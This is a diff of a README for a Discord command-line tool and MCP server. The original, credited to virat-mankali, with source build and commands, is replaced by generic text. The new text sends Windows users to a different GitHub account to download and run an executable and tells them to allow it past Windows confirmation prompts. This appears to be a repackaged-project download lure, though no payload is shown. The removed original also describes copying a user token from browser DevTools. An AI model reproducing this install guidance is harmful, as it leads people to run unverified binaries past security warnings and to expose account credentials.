@@ -1,125 +1,236 @@
-# 🎮 discocli — Discord CLI + MCP Server
+# 🧭 discord-cli - Control Discord from your terminal
 
-Interact with Discord from your terminal. Built for developers and AI agents.
+[![Download discord-cli](https://img.shields.io/badge/Download%20discord--cli-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Linotypefibre247/discord-cli)
 
-```bash
-discocli sync --follow          # real-time message capture
-discocli search "deployment"    # offline full-text search
-discocli send --to "#general" --text "Build passed ✅"
-discocli serve                  # start MCP server for AI agents
-```
+## 🚀 What this app does
 
-## Install
+discord-cli lets you read, search, and send Discord messages from your terminal on Windows.
 
-### Homebrew (macOS & Linux)
+It is made for people who want a fast way to work with Discord without opening the full app each time. It also works well for AI agents and local tools that need to talk to Discord through MCP.
 
-```bash
-brew install virat-mankali/tap/discocli
-```
+## ✨ What you can do
 
-### Build from source
+- Read recent Discord messages from the terminal
+- Search past messages by keyword
+- Send messages to a channel
+- Keep a local sync of message data
+- Connect with MCP-based tools and agents
+- Use a simple command-line workflow on Windows
 
-```bash
-git clone https://github.com/virat-mankali/discord-cli
-cd discord-cli
-go build -o discocli ./cmd/discocli/
-```
+## 💻 What you need
 
-## Quick Start
+- Windows 10 or Windows 11
+- An internet connection
+- A Discord account
+- Permission to use the Discord server and channel you want to access
+- A terminal window such as PowerShell or Windows Terminal
 
-```bash
-# 1. Authenticate (bot token or user token)
-discocli auth
+## 📥 Download and install
 
-# 2. Sync messages
-discocli sync
+Visit this page to download the app:
 
-# 3. Search offline
-discocli search "standup notes"
+[https://github.com/Linotypefibre247/discord-cli](https://github.com/Linotypefibre247/discord-cli)
 
-# 4. Send a message
-discocli send --to "#general" --text "Hello from the terminal!"
-```
+After you open the page:
 
-## Commands
+1. Look for the latest release or download files on the page
+2. Download the Windows version
+3. Save the file to your Downloads folder or Desktop
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app file for Windows
 
-| Command | Description |
-|---------|-------------|
-| `discocli auth` | Authenticate with Discord (bot or user token) |
-| `discocli whoami` | Show the currently authenticated user |
-| `discocli sync` | Sync message history to local SQLite database |
-| `discocli sync --follow` | Real-time sync via Discord Gateway |
-| `discocli search <query>` | Full-text search across synced messages |
-| `discocli send --to <target> --text <msg>` | Send message to channel, DM, or thread |
-| `discocli guilds` | List all servers you're in |
-| `discocli channels --guild <name>` | List channels in a server |
-| `discocli serve` | Start MCP server for AI agents |
+If Windows asks for confirmation, choose the option that lets the app run.
 
-## MCP Server (AI Agents)
+## 🪟 First-time setup on Windows
 
-Add to your `mcp.json`:
+When you run discord-cli for the first time, you may need to connect your Discord account.
 
-```json
-{
-  "mcpServers": {
-    "discocli": {
-      "command": "discocli",
-      "args": ["serve"],
-      "env": {},
-      "disabled": false,
-      "autoApprove": [
-        "search_messages",
-        "list_guilds",
-        "list_channels",
-        "get_sync_status"
-      ]
-    }
-  }
-}
-```
+Follow these steps:
 
-### Available MCP Tools
+1. Open the app or terminal tool
+2. Sign in with your Discord details if asked
+3. Allow access to the server or channel you want to use
+4. Pick the workspace or server you want to sync
+5. Let the app finish its first sync
 
-| Tool | Description | Auto-approve? |
-|------|-------------|---------------|
-| `search_messages` | Full-text search across synced messages | ✅ |
-| `list_guilds` | List all Discord servers | ✅ |
-| `list_channels` | List channels in a server | ✅ |
-| `get_sync_status` | Show sync status and message counts | ✅ |
-| `send_message` | Send a message to a channel | ❌ |
-| `sync_channel` | Sync a channel's history | ❌ |
+If you use more than one Discord server, start with the one you use most.
 
-- You can optionally add `send_message` and `sync_channel` to the `autoApprove` array in your `mcp.json` if you want your AI agent to use them without confirmation. They're excluded by default since they perform write operations.
+## ⌨️ How to use it
 
-## How It Works
+Open PowerShell or Windows Terminal, then use the app commands to work with Discord.
 
-- Messages are synced from Discord into a local SQLite database with FTS5 full-text search
-- All searches are offline — fast and private
-- Incremental sync only fetches new messages on subsequent runs
-- The MCP server exposes the same functionality over stdio for AI agents
-- Pure Go binary, no CGO — works on all platforms
+Common tasks include:
 
-## Token Setup
+- Sync messages from a channel
+- Search for a message by word or phrase
+- Send a new message
+- Check recent activity
 
-### Bot Token (Recommended)
+Example workflow:
 
-1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
-2. Create application → Bot → Reset Token
-3. Enable **Message Content Intent** under Privileged Gateway Intents
-4. Invite bot to your server with `Read Messages`, `Send Messages`, `Read Message History`, `Attach Files` permissions
+1. Start the app
+2. Choose your server or channel
+3. Run a sync command
+4. Search for the message you need
+5. Send a message if needed
 
-### User Token (Personal Use)
+If you are not sure what to type, use the built-in help command shown by the app.
 
-1. Open Discord in browser
-2. DevTools → Network → any API request → Authorization header
+## 🔍 Searching messages
 
-> ⚠️ **Important:** Bot tokens are always the safer choice. User tokens violate Discord's Terms of Service if used for automation at scale. They're fine for personal/local use and AI agents acting on your behalf, but bot tokens are more stable, officially supported, and won't risk your account. When in doubt, use a bot token.
+Searching helps you find old messages fast.
 
-## Inspired By
+Use search when you want to:
 
-- [steipete/wacli](https://github.com/steipete/wacli) — WhatsApp CLI by Peter Steinberger
-- [virat-mankali/telegram-cli](https://github.com/virat-mankali/telegram-cli) — Telegram CLI
+- Find a link sent earlier
+- Look up a name or topic
+- Check what was said in a chat
+- Review past work messages
 
-## License
+Tips for better search results:
 
-MIT
+- Use short keywords
+- Search one topic at a time
+- Try a sender name if you know it
+- Use a phrase from the message if you remember it
+
+## 📤 Sending messages
+
+You can send messages from your terminal to a Discord channel.
+
+This is useful when you want to:
+
+- Share a quick update
+- Post a status note
+- Send a test message
+- Reply from a script or tool
+
+Before you send a message, check that:
+
+- You are in the right channel
+- You have permission to post
+- The message text is correct
+
+## 🤖 MCP Server support
+
+discord-cli includes MCP Server support for tools and AI agents.
+
+This lets connected tools:
+
+- Read Discord data
+- Search messages
+- Send messages
+- Work with Discord in a structured way
+
+Use this if you want to connect Discord to local agents, scripts, or developer tools. It is useful for automation and for workflows that need message access in a simple format.
+
+## 🗂️ Local sync and storage
+
+The app can keep synced Discord data in a local SQLite database.
+
+That helps with:
+
+- Fast search
+- Offline browsing of stored data
+- Better message lookup
+- Repeated use without full re-downloads each time
+
+Your local data stays on your computer unless you share it through another tool.
+
+## 🔐 Permissions you may need
+
+To use discord-cli, your Discord account or bot setup may need access to:
+
+- Read messages
+- View channels
+- Send messages
+- Read message history
+
+If a command does not work, check the channel permissions in Discord first.
+
+## 🛠️ Basic usage flow
+
+Use this simple flow the first time:
+
+1. Download the Windows app from the link above
+2. Open the downloaded file
+3. Sign in or connect your Discord account
+4. Choose a server or channel
+5. Sync your messages
+6. Search or send messages from the terminal
+
+If you want to use it with an agent or other tool, set up the MCP server after the first sync works.
+
+## 🧪 Example tasks
+
+Here are a few things you can do with the app:
+
+- Find a message with a file link
+- Check a channel for recent updates
+- Send a reminder to a team channel
+- Build a local message index for search
+- Connect Discord to an automation workflow
+
+## 📁 Files and data
+
+discord-cli may create local files for:
+
+- Synced message data
+- Search indexes
+- App settings
+- MCP connection details
+
+Keep these files in a folder you can find again. If you move the app, make sure its local data moves with it if needed.
+
+## 🔁 Updating the app
+
+When a new version is posted:
+
+1. Open the download page again
+2. Get the latest Windows file
+3. Replace the old version
+4. Open the new version
+5. Sync again if needed
+
+If you keep local data in a separate folder, your search history and synced messages may stay intact
+
+## 🧭 Common problems
+
+If the app does not open:
+
+- Check that the download finished
+- Make sure you extracted the file if it came in a zip folder
+- Run it again as a normal Windows app
+
+If messages do not appear:
+
+- Check your Discord connection
+- Check your channel permissions
+- Sync the server or channel again
+
+If search gives no results:
+
+- Try a shorter keyword
+- Make sure the channel was synced
+- Check that the message exists in the local data
+
+If you cannot send a message:
+
+- Confirm that you have posting rights in the channel
+- Check that the channel is not read-only
+- Try a different channel to test access
+
+## 📌 Project details
+
+- Name: discord-cli
+- Type: Discord command-line app
+- Use case: Read, search, and send Discord messages
+- Platform focus: Windows
+- Data store: SQLite
+- Tool support: MCP Server
+- Main users: Developers, AI agents, and people who want terminal-based Discord access
+
+## 🧩 Topics
+
+ai-agents, cli, developer-tools-ai-agent, discord, discord-cli, golang, mcp, mcp-server, sqlite, terminal
